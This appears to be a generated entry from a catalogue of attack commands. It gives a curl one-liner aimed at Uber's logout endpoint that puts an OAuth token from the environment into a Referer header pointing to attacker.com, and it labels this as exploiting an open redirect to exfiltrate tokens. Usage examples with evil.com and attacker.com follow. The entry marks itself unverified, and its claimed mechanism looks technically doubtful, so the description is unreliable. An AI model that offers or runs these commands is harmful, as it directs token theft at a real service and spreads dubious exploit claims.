---
data: >-
  curl -L "https://login.uber.com/logout" -H "Referer:
  https://attacker.com/capture?token=$(echo $OAUTH_TOKEN)" -v
tags:
  - open-redirect
  - curl
  - exfil
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:39.093Z'
id: 129b3e74-8ba5-4a45-ba25-ba36909abe43
verified: false
validated: true
submitted: true
---
# curl-uber-logout-redirect

## Command

```bash
curl -L "https://login.uber.com/logout" -H "Referer: https://attacker.com/capture?token=$(echo $OAUTH_TOKEN)" -v
```

## Description

Exploits the logout endpoint's open redirect by setting a malicious Referer header to exfiltrate tokens.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H Referer` | Malicious redirect target with token | Yes |
| `-L` | Follow to attacker site | Yes |

## Examples

### Basic Usage

```bash
curl -L "https://login.uber.com/logout" -H "Referer: https://evil.com" -v
```

### Advanced Usage

```bash
curl -L "https://login.uber.com/logout" -H "Referer: https://attacker.com?token=ABC123" -v
```

## Expected Output

Final 302 to the Referer URL, leaking params.

## Related

- [[Related Procedure: Exploit-Open-Redirect-on-Logout-to-Steal-Token]]
